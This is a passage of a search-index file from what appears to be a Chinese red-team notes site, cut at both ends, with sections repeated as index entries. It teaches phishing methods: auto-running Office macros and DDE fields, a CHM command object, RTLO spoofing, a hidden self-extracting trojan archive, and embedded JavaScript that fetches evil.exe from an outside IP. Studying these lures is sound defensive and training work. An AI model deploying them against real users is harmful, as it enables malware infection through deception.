\u7136\u540e\u53eb\u4ed6\u968f\u4fbf\u626b\u626b\u75c5\u6bd2\u5565\u7684\uff0c\u88c5\u7684\u6211\u4eec\u5f88\u6b63\u7ecf","title":"\u6587\u6848\u5927\u7eb2"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/#_3","text":"\u4ed6\u4eec\u5b89\u88c5\u4e86\u5b89\u5168\u4e91\u5e76\u81ea\u52a8\u52a0\u5165\u7ec4\u7ec7\u540e\u5c31\u4f1a\u4e0a\u7ebf \u7f3a\u70b9\uff1a\u8981\u51b2VIP\uff081000\u5757\u4e00\u5e74\uff09\u624d\u80fd\u76f4\u63a5\u8fdc\u63a7\uff0c\u514d\u8d39\u7248\u7684\u8fdc\u63a7\u5f97\u53d7\u63a7\u7aef\u624b\u52a8\u70b9\u51fb\u63a5\u53d7\u624d\u884c\u3002 \u603b\u7ed3\uff1a\u88ab\u4eba\u66dd\u5149\u8fd9\u4e2a\u601d\u8def\u540e\uff0c\u5c31\u53d8\u6210\u4e86\u70c2\u4e2d\u4e4b\u70c2\u3002","title":"\u64cd\u4f5c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/","text":"\u9493\u9c7c\u6280\u5de7 \u76ee\u5f55 OFFICE Office\u5b89\u5168\u4fdd\u62a4\u673a\u5236 \u53d7\u4fdd\u62a4\u7684\u89c6\u56fe XLM / Macro 4.0 \uff08excel\u5b8f\u9493\u9c7c\uff09 Word\u5b8f Word DDE office OLE+LNK \u5d4c\u5165js\u5143\u7d20 \u5229\u7528\u6a21\u677f\u6587\u4ef6\u6ce8\u5165\u5b8f\u6307\u4ee4 CHM \u7535\u5b50\u4e66 \u56fe\u6807\u66ff\u6362 RTLO rar\u89e3\u538b\u81ea\u8fd0\u884c OFFICE Office\u5b89\u5168\u4fdd\u62a4\u673a\u5236 \u53d7\u4fdd\u62a4\u7684\u89c6\u56fe \u4e3a\u4e86\u4fdd\u62a4\u8ba1\u7b97\u673a\u4e0d\u53d7office\u75c5\u6bd2\u4fb5\u5bb3\uff0c\u5fae\u8f6f\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u6536\u4fdd\u62a4\u89c6\u56fe\uff0c\u5c06\u6240\u6709\u53ef\u7591\u7684office\u6587\u4ef6\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\uff0c\u5728\u8be5\u6a21\u5f0f\u4e0b\u591a\u6570\u7f16\u8f91\u529f\u80fd\u88ab\u7981\u7528\u3002\u6587\u4ef6\u5457\u4ee5\u53d7\u4fdd\u62a4\u89c6\u56fe\u6253\u5f00\u7684\u60c5\u51b5\u6709\u5982\u4e0b\u51e0\u79cd \u6587\u4ef6\u662f\u4ece Internet \u4f4d\u7f6e\u6253\u5f00\u7684 \u6587\u4ef6\u662f\u901a\u8fc7 Outlook \u9644\u4ef6\u7684\u65b9\u5f0f\u63a5\u6536\u7684\uff0c\u5e76\u4e14\u8ba1\u7b97\u673a\u7b56\u7565\u5c06\u53d1\u4ef6\u4eba\u5b9a\u4e49\u4e3a\u4e0d\u5b89\u5168 \u6587\u4ef6\u662f\u4ece\u4e0d\u5b89\u5168\u7684\u4f4d\u7f6e\u6253\u5f00\u7684 \u6587\u4ef6\u88ab\u6587\u4ef6\u5757\u963b\u6b62 \u6587\u4ef6\u9a8c\u8bc1\u5931\u8d25 \u6587\u4ef6\u662f\u4f7f\u7528\u201c\u5728\u53d7\u4fdd\u62a4\u7684\u89c6\u56fe\u4e2d\u6253\u5f00\u201d\u9009\u9879\u6253\u5f00\u7684 \u6587\u4ef6\u662f\u4ece\u5176\u4ed6\u4eba\u7684 OneDrive \u5b58\u50a8\u4e2d\u6253\u5f00\u7684 XLM / Macro 4.0 \uff08excel\u5b8f\u9493\u9c7c\uff09 excel\u4e0b\u6709\u5b8f\u529f\u80fd\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5176\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b \u53f3\u952e\u4e0b\u65b9sheet1\uff0c\u9009\u62e9\u63d2\u5165 \u70b9\u51fb MS Excel4.0\u5b8f\u8868\uff0c\u5c31\u53ef\u5728excel\u4e2d\u63d2\u5165\u4e00\u4e2a\u5b8f\u8868 \u4f9d\u6b21\u8f93\u5165\u8fd9\u4e24\u4e2a\u547d\u4ee4\uff0c\u5e76\u628a\u7b2c\u4e00\u884c\u8bbe\u7f6e\u4e3aAuto_Open \u968f\u540e\u4fdd\u5b58\u4e3axlsm\u6587\u4ef6\u5373\u53ef\u3002\u968f\u540e\u5f53\u8be5\u6587\u4ef6\u88ab\u6253\u5f00\u65f6\uff0c\u4f1a\u81ea\u52a8\u6253\u5f00cmd\u7a97\u53e3 \u8fd9\u91cc\u7684exec\u5176\u5b9e\u662f\u6267\u884c\u7684cmd\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u4e0a\u7ebfcs\u7b49\u64cd\u4f5c\u3002 \u771f\u4e0d\u9519\u3002\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u6253\u5f00\u6b64\u7c7bexcel\u6587\u4ef6\u9700\u624b\u52a8\u70b9\u51fb\u542f\u7528\u5b8f\u624d\u80fd\u6b63\u5e38\u9493\u9c7c\u3002 Word\u5b8f \u65b0\u5efa\u4e00\u4e2aword\u6587\u4ef6\uff0c\u8fdb\u5165\u5b8f\u9009\u9879\uff08\u5982\u679c\u6ca1\u6709\u8bf7\u81ea\u884c\u5728\u5f00\u53d1\u8005\u5de5\u5177\u91cc\u5f00\u542f \u7136\u540e\u968f\u4fbf\u8f93AutoOpen(\u6587\u4ef6\u6253\u5f00\u65f6\u81ea\u52a8\u6267\u884c\u5b8f)\uff0c\u521b\u5efa\uff0c\u6ce8\u610f\u5b8f\u7684\u4f4d\u7f6e\u8981\u6307\u5b9a\u4e3a\u5f53\u524d\u6587\u6863 \u7136\u540e\u8fdb\u5165\u5b8f\u7f16\u8f91\u6846 \u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4 Sub AutoOpen() Shell (\"calc\") //\u53ea\u9700\u8981\u5199\u8fd9\u4e2a\u5c31\u884c\u4e86 End Sub AutoExec\uff1a\u542f\u52a8 Word \u6216\u52a0\u8f7d\u5168\u5c40\u6a21\u677f\u65f6 AutoNew\uff1a\u6bcf\u6b21\u65b0\u5efa\u6587\u6863\u65f6 AutoOpen\uff1a\u6bcf\u6b21\u6253\u5f00\u5df2\u6709\u6587\u6863\u65f6 AutoClose\uff1a\u6bcf\u6b21\u5173\u95ed\u6587\u6863\u65f6 AutoExit\uff1a\u9000\u51fa Word \u6216\u5378\u8f7d\u5168\u5c40\u6a21\u677f\u65f6 \u4fdd\u5b58\u4e3adocm\uff08\u542f\u7528\u5b8f\u7684word\u6587\u6863\uff09 \u6253\u5f00\u6587\u4ef6\uff0c\u5c31\u8e66\u51fa\u8ba1\u7b97\u5668\u4e86\u3002\uff08\u524d\u63d0\u662f\u5728\u4fe1\u4efb\u4e2d\u5fc3\u8bbe\u7f6e\u5f00\u542f\u6240\u6709\u5b8f\uff09 \u5f53\u7136\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u6253\u5f00\u6b64\u7c7b\u6587\u4ef6\u4f1a\u663e\u793a \u542f\u7528\u5185\u5bb9\u540e\u5c31\u4f1a\u5f39\u8ba1\u7b97\u5668\u4e86 Word DDE \u5728word\u6587\u4ef6\u91cc\uff0c\u8f93\u5165 ctrl+F9,\u8fdb\u5165\u5230\u57df\u4ee3\u7801\u7f16\u8f91\u3002\u6211\u4eec\u53ef\u4ee5\u952e\u5165\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u6587\u4ef6\u5728\u88ab\u6253\u5f00\u65f6\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff08word2019\u590d\u73b0\u672a\u6210\u529f\uff0cword2016\u6210\u529f\uff0c\u4f3c\u4e4e\u662fword\u7248\u672c\u95ee\u9898 \u8fd9\u4e2a\u86ee\u5b9e\u7528\u7684\uff0c\u76ee\u524d\u4f17\u591aword\u662f\u9ed8\u8ba4\u7981\u7528\u5b8f\u7684\uff0cdde\u53ea\u9700\u8981\u7528\u6237\u70b9\u51fb\u4e24\u4e2a\u6309\u94ae\u5373\u53ef\u6267\u884c\uff0c\u5b9e\u7528\u6027\u6bd4\u5b8f\u597d DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" \u968f\u540e\u5728\u6253\u5f00\u8be5\u6587\u4ef6\u65f6\u4f1a\u51fa\u73b0\u4e24\u4e2a\u5bf9\u8bdd\u6846\uff0c\u5168\u70b9\u662f\u5c31\u4f1a\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u4e86 office OLE+LNK \u6838\u5fc3\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u5185\u5d4c\u7684lnk\u6587\u4ef6\u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u6267\u884c\u547d\u4ee4\u3002word\uff0cexcel\u90fd\u80fd\u4f7f\u7528 \u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5feb\u6377\u65b9\u5f0f\u5982\u4e0b \u5176\u76ee\u6807\u5904\u586b\u5199\u7684\u662f %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command calc \u7136\u540e\u6253\u5f00word\u6587\u4ef6\uff0c\u63d2\u5165\u5bf9\u8c61\uff0c\u9009\u62e9package\uff0c\u4e3a\u4e86\u66f4\u52a0\u903c\u771f\u52fe\u9009\u663e\u793a\u4e3a\u56fe\u6807\uff0c\u7136\u540e\u53ef\u4ee5\u66f4\u6539\u56fe\u6807\uff0c\u6211\u4eec\u5728\u66f4\u6539\u56fe\u6807\u5904\u9009\u62e9\u4e00\u4e2a\u8ff7\u60d1\u6027\u6bd4\u8f83\u5927\u7684\u56fe\u6807 \u7136\u540e\u8fdb\u5165\u521b\u5efa\u8f6f\u4ef6\u5305\u754c\u9762\uff0c\u9009\u62e9\u6211\u4eec\u521a\u521a\u521b\u5efa\u7684lnk\u6587\u4ef6\uff0c\u5199\u597d\u5377\u6807\u540d\uff0c\u7136\u540e\u5c31\u628a\u8f6f\u4ef6\u5305\u63d2\u5165\u5230word\u754c\u9762\u4e86\uff0c\u53ea\u8981\u7528\u6237\u70b9\u51fb\u8be5\u8f6f\u4ef6\u5305\u5e76\u9009\u62e9\u6267\u884c\uff0c\u5219\u4f1a\u6267\u884c\u6211\u4eec\u5728lnk\u4e2d\u5b9a\u4e49\u7684\u4ee3\u7801 \u800c\u4e14\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5982\u679c\u7528\u4e0a\u8ff0\u65b9\u6cd5\u628alnk\u6587\u4ef6\u653e\u5165publisher\u6587\u4ef6\uff0c\u5219\u5728\u7f51\u7edc\u4e2d\u6253\u5f00\u8be5\u6587\u4ef6\u65f6\u4e0d\u4f1a\u89e6\u53d1\u53d7\u4fdd\u62a4\u89c6\u56fe\u3002\uff08\u53ef\u80fd\u662f\u6211\u672c\u5730\u73af\u5883\u6709\u70b9\u9519\uff1f\u6211\u89c9\u5f97\u8fd9\u4e2a\u6709\u70b9\u79bb\u8c31 \u5d4c\u5165js\u5143\u7d20 \u8fd9\u4e2a\u8bf4\u5b9e\u8bdd\u9700\u8981\u4e00\u70b9js\u529f\u5e95\u3002\u3002 \u8fd9\u4e2a\u65b9\u5f0f\u7684\u539f\u7406\u662f\uff0c\u5982\u679c\u6211\u4eec\u5f80word\u4e2d\u63d2\u5165\u8054\u673a\u89c6\u9891\uff0c\u90a3\u4e48\u518dword\u7684\u538b\u7f29\u5305 word/document.xml\u91cc\u7684embeddedHtml\u9879\u4e2d\u4f1a\u51fa\u73b0\u8054\u673a\u89c6\u9891\u5bf9\u5e94\u7684\u5185\u5d4chtml\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e9b\u4ee3\u7801\uff0c\u63d2\u5165\u6076\u610fjs\u4ee3\u7801\u3002 \u4e00\u822c\u7684\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7js\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6\uff0c\u4f46\u662f\u4f3c\u4e4e\u662f\u56e0\u4e3aword\u7684\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236\uff0c\u4e0d\u80fd\u5b9e\u73b0\u9875\u9762\u8df3\u8f6c\u6216\u8005\u81ea\u52a8\u70b9\u51fb\u4e0b\u8f7d\u7b49\u64cd\u4f5c(\u6253\u5f00word\u6587\u4ef6\u4f1a\u62a5\u9519),\u597d\u8ff7 <html> <body> <script> var a = document.createElement('a'); console.log(a); document.body.appendChild(a); a.style = 'display: none'; a.href = \"http://149.129.64.180/evil.exe\"; //\u8be5\u884c\u82e5\u5b58\u5728\uff0c\u6253\u5f00word\u6587\u4ef6\u4f1a\u62a5\u9519 a.download = fileName; window.URL.revokeObjectURL(url); </script> <script> a.click(); </script> </body> </html> \u6211\u770b\u4e86\u4e00\u4e2aPOC\uff0c\u91cc\u9762\u662f\u901a\u8fc7\u6784\u9020\u4e8c\u8fdb\u5236\u6570\u636e\u4ea4\u7ed9BLOB\u5bf9\u8c61\u5904\u7406\uff0c\u5e76\u81ea\u52a8\u70b9\u51fb\u7531BLOB\u5bf9\u8c61\u751f\u6210\u7684url\u5b9e\u73b0\u4e0b\u8f7d\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u800c\u8fd9\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u5b9e\u8d28\u4e0a\u662f\u6076\u610f\u6587\u4ef6\u3002 \u56e0\u4e3a\u6211\u641e\u4e0d\u6765\u90a3\u4e2a\u4e8c\u8fdb\u5236\u6570\u636e\u600e\u4e48\u4ea7\u751f\uff0c\u6240\u4ee5\u8fd9\u4e2a\u65b9\u6cd5\u6682\u65f6\u53ea\u505a\u4e86\u89e3\u5427\u3002\u3002 \u800c\u4e14\u6211\u770b\u7684\u90a3\u4e2a\u6587\u7ae0\u7684POC\u5728\u6211\u7684word2016\u91cc\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u539f\u56e0 reference: https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload \u5229\u7528\u6a21\u677f\u6587\u4ef6\u6ce8\u5165\u5b8f\u6307\u4ee4 \u539f\u7406\u662f\uff0c\u5148\u521b\u5efa\u4e00\u4e2a\u5e26\u6a21\u677f\u7684\u6587\u6863\uff0c\u518d\u521b\u4e00\u4e2a\u542f\u7528\u5b8f\u7684\u6a21\u677f\u6587\u4ef6\u3002\u7136\u540e\u5728\u5e26\u6a21\u677f\u7684\u6587\u6863\u7684\u538b\u7f29\u5305\u91cc\u9762\u4fee\u6539\u4e00\u4e9b\u5185\u5bb9\uff0c\u4f7f\u5176\u6307\u5411\u7684\u6a21\u677f\u4fee\u6539\u4e3a\u6211\u4eec\u81ea\u5df1\u521b\u5efa\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u8fd9\u4e4b\u95f4\u7684\u8fc7\u7a0b\u53ef\u4ee5\u7531smb\u534f\u8bae\u5b8c\u6210\uff0c\u6545\u8fc7\u67e5\u6740\u51e0\u7387\u8f83\u9ad8\u3002 \u6211\u4eec\u5728\u542f\u7528\u5b8f\u7684\u6a21\u677f\u6587\u4ef6\uff08doc3.dotm)\u91cc\u5199\u5165\u5b8f\u3002 Sub AutoOpen() Shell \"calc\" End Sub CHM \u7535\u5b50\u4e66 \u65b0\u5efa\u4e00\u4e2ahtml\u6587\u4ef6\uff0c\u7f16\u7801\u683c\u5f0fANSI\uff0c\u5411\u91cc\u9762\u5199\u5165\u5982\u4e0b\u5185\u5bb9 <!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body> command exec <OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1> <PARAM name=\"Command\" value=\"ShortCut\"> <PARAM name=\"Button\" value=\"Bitmap::shortcut\"> <PARAM name=\"Item1\" value=',cmd.exe,/c calc.exe'> //\u8fd9\u4e00\u6392\u7528\u4e8e\u6267\u884c\u547d\u4ee4\uff0c\u6ce8\u610fcmd.exe\u524d\u540e\u90fd\u6709,\u6216\u8005<PARAM name=\"Item1\" value=',powershell.exe,-c calc.exe'>\u4e5f\u884c <PARAM name=\"Item2\" value=\"273,1,1\"> </OBJECT> <SCRIPT> x.Click(); </SCRIPT> </body></html> \u7528easychm\uff0c\u65b0\u5efa-\u6d4f\u89c8-\u9009\u62e9html\u6587\u4ef6\u6240\u5728\u76ee\u5f55-\u9009\u62e9html\u6587\u4ef6-\u7f16\u8bd1 \u751f\u6210\u4e00\u4e2achm\uff0c\u53cc\u51fb\uff0c\u6253\u5f00\u4e86\u8ba1\u7b97\u5668 \u56fe\u6807\u66ff\u6362 \u4f7f\u7528Restorator\uff0c\u6253\u5f00\u9700\u8981\u66ff\u6362\u56fe\u6807\u7684exe\uff0c\u63d0\u4f9b\u56fe\u6807\u7684exe\uff0c\u5982\u4e0b \u53f3\u952emain.exe,\u6dfb\u52a0\u8d44\u6e90\uff0c\u56fe\u6807\uff0cid\u9009\u62e9127. \u968f\u540e\u53f3\u952eListary.exe/\u56fe\u6807/127 \u5bfc\u51fa\uff0c\u5c06\u5176\u5bfc\u51fa\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u7136\u540e\u53f3\u952emain.exe/\u56fe\u6807\uff0c\u5bfc\u5165\uff0c\u9009\u62e9\u521a\u521a\u5bfc\u51fa\u56fe\u6807\u7684\u6587\u4ef6\u5939\uff0c\u786e\u5b9a,ctrl+\u4fdd\u5b58 RTLO \u7ee7\u7eed\u91cd\u547d\u540d\uff0c\u5728a\u540e\u9762\u53f3\u952e\uff0c\u63d2\u5165Unicode\u63a7\u5236\u5b57\u7b26->RLO rar\u89e3\u538b\u81ea\u8fd0\u884c \u6728\u9a6c\u6587\u4ef6:artifact.exe \u8ff7\u60d1\u6587\u4ef6:calc.exe \u8fdb\u5165winrar\uff0c\u9009\u4e2d\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff0c\u53f3\u952e\u6dfb\u52a0\u81f3\u538b\u7f29\u5305.\u521b\u5efa\u81ea\u89e3\u538b\u683c\u5f0f\u538b\u7f29\u6587\u4ef6 \u9ad8\u7ea7->\u81ea\u89e3\u538b\u9009\u9879->\u8bbe\u7f6e \u6a21\u5f0f->\u5168\u90e8\u9690\u85cf \u66f4\u65b0->\u89e3\u538b\u5e76\u66f4\u65b0\u6587\u4ef6,\u8986\u76d6\u6240\u6709\u6587\u4ef6 \u751f\u6210,\u53cc\u51fb\u8fd0\u884c","title":"\u9493\u9c7c\u6280\u5de7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#_1","text":"","title":"\u9493\u9c7c\u6280\u5de7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#_2","text":"OFFICE Office\u5b89\u5168\u4fdd\u62a4\u673a\u5236 \u53d7\u4fdd\u62a4\u7684\u89c6\u56fe XLM / Macro 4.0 \uff08excel\u5b8f\u9493\u9c7c\uff09 Word\u5b8f Word DDE office OLE+LNK \u5d4c\u5165js\u5143\u7d20 \u5229\u7528\u6a21\u677f\u6587\u4ef6\u6ce8\u5165\u5b8f\u6307\u4ee4 CHM \u7535\u5b50\u4e66 \u56fe\u6807\u66ff\u6362 RTLO rar\u89e3\u538b\u81ea\u8fd0\u884c","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#office","text":"","title":"OFFICE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#office_1","text":"","title":"Office\u5b89\u5168\u4fdd\u62a4\u673a\u5236"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#_3","text":"\u4e3a\u4e86\u4fdd\u62a4\u8ba1\u7b97\u673a\u4e0d\u53d7office\u75c5\u6bd2\u4fb5\u5bb3\uff0c\u5fae\u8f6f\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u6536\u4fdd\u62a4\u89c6\u56fe\uff0c\u5c06\u6240\u6709\u53ef\u7591\u7684office\u6587\u4ef6\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\uff0c\u5728\u8be5\u6a21\u5f0f\u4e0b\u591a\u6570\u7f16\u8f91\u529f\u80fd\u88ab\u7981\u7528\u3002\u6587\u4ef6\u5457\u4ee5\u53d7\u4fdd\u62a4\u89c6\u56fe\u6253\u5f00\u7684\u60c5\u51b5\u6709\u5982\u4e0b\u51e0\u79cd \u6587\u4ef6\u662f\u4ece Internet \u4f4d\u7f6e\u6253\u5f00\u7684 \u6587\u4ef6\u662f\u901a\u8fc7 Outlook \u9644\u4ef6\u7684\u65b9\u5f0f\u63a5\u6536\u7684\uff0c\u5e76\u4e14\u8ba1\u7b97\u673a\u7b56\u7565\u5c06\u53d1\u4ef6\u4eba\u5b9a\u4e49\u4e3a\u4e0d\u5b89\u5168 \u6587\u4ef6\u662f\u4ece\u4e0d\u5b89\u5168\u7684\u4f4d\u7f6e\u6253\u5f00\u7684 \u6587\u4ef6\u88ab\u6587\u4ef6\u5757\u963b\u6b62 \u6587\u4ef6\u9a8c\u8bc1\u5931\u8d25 \u6587\u4ef6\u662f\u4f7f\u7528\u201c\u5728\u53d7\u4fdd\u62a4\u7684\u89c6\u56fe\u4e2d\u6253\u5f00\u201d\u9009\u9879\u6253\u5f00\u7684 \u6587\u4ef6\u662f\u4ece\u5176\u4ed6\u4eba\u7684 OneDrive \u5b58\u50a8\u4e2d\u6253\u5f00\u7684","title":"\u53d7\u4fdd\u62a4\u7684\u89c6\u56fe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#xlm-macro-40-excel","text":"excel\u4e0b\u6709\u5b8f\u529f\u80fd\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5176\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b \u53f3\u952e\u4e0b\u65b9sheet1\uff0c\u9009\u62e9\u63d2\u5165 \u70b9\u51fb MS Excel4.0\u5b8f\u8868\uff0c\u5c31\u53ef\u5728excel\u4e2d\u63d2\u5165\u4e00\u4e2a\u5b8f\u8868 \u4f9d\u6b21\u8f93\u5165\u8fd9\u4e24\u4e2a\u547d\u4ee4\uff0c\u5e76\u628a\u7b2c\u4e00\u884c\u8bbe\u7f6e\u4e3aAuto_Open \u968f\u540e\u4fdd\u5b58\u4e3axlsm\u6587\u4ef6\u5373\u53ef\u3002\u968f\u540e\u5f53\u8be5\u6587\u4ef6\u88ab\u6253\u5f00\u65f6\uff0c\u4f1a\u81ea\u52a8\u6253\u5f00cmd\u7a97\u53e3 \u8fd9\u91cc\u7684exec\u5176\u5b9e\u662f\u6267\u884c\u7684cmd\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u4e0a\u7ebfcs\u7b49\u64cd\u4f5c\u3002 \u771f\u4e0d\u9519\u3002\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u6253\u5f00\u6b64\u7c7bexcel\u6587\u4ef6\u9700\u624b\u52a8\u70b9\u51fb\u542f\u7528\u5b8f\u624d\u80fd\u6b63\u5e38\u9493\u9c7c\u3002","title":"XLM / Macro 4.0 \uff08excel\u5b8f\u9493\u9c7c\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#word","text":"\u65b0\u5efa\u4e00\u4e2aword\u6587\u4ef6\uff0c\u8fdb\u5165\u5b8f\u9009\u9879\uff08\u5982\u679c\u6ca1\u6709\u8bf7\u81ea\u884c\u5728\u5f00\u53d1\u8005\u5de5\u5177\u91cc\u5f00\u542f \u7136\u540e\u968f\u4fbf\u8f93AutoOpen(\u6587\u4ef6\u6253\u5f00\u65f6\u81ea\u52a8\u6267\u884c\u5b8f)\uff0c\u521b\u5efa\uff0c\u6ce8\u610f\u5b8f\u7684\u4f4d\u7f6e\u8981\u6307\u5b9a\u4e3a\u5f53\u524d\u6587\u6863 \u7136\u540e\u8fdb\u5165\u5b8f\u7f16\u8f91\u6846 \u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4 Sub AutoOpen() Shell (\"calc\") //\u53ea\u9700\u8981\u5199\u8fd9\u4e2a\u5c31\u884c\u4e86 End Sub AutoExec\uff1a\u542f\u52a8 Word \u6216\u52a0\u8f7d\u5168\u5c40\u6a21\u677f\u65f6 AutoNew\uff1a\u6bcf\u6b21\u65b0\u5efa\u6587\u6863\u65f6 AutoOpen\uff1a\u6bcf\u6b21\u6253\u5f00\u5df2\u6709\u6587\u6863\u65f6 AutoClose\uff1a\u6bcf\u6b21\u5173\u95ed\u6587\u6863\u65f6 AutoExit\uff1a\u9000\u51fa Word \u6216\u5378\u8f7d\u5168\u5c40\u6a21\u677f\u65f6 \u4fdd\u5b58\u4e3adocm\uff08\u542f\u7528\u5b8f\u7684word\u6587\u6863\uff09 \u6253\u5f00\u6587\u4ef6\uff0c\u5c31\u8e66\u51fa\u8ba1\u7b97\u5668\u4e86\u3002\uff08\u524d\u63d0\u662f\u5728\u4fe1\u4efb\u4e2d\u5fc3\u8bbe\u7f6e\u5f00\u542f\u6240\u6709\u5b8f\uff09 \u5f53\u7136\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u6253\u5f00\u6b64\u7c7b\u6587\u4ef6\u4f1a\u663e\u793a \u542f\u7528\u5185\u5bb9\u540e\u5c31\u4f1a\u5f39\u8ba1\u7b97\u5668\u4e86","title":"Word\u5b8f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#word-dde","text":"\u5728word\u6587\u4ef6\u91cc\uff0c\u8f93\u5165 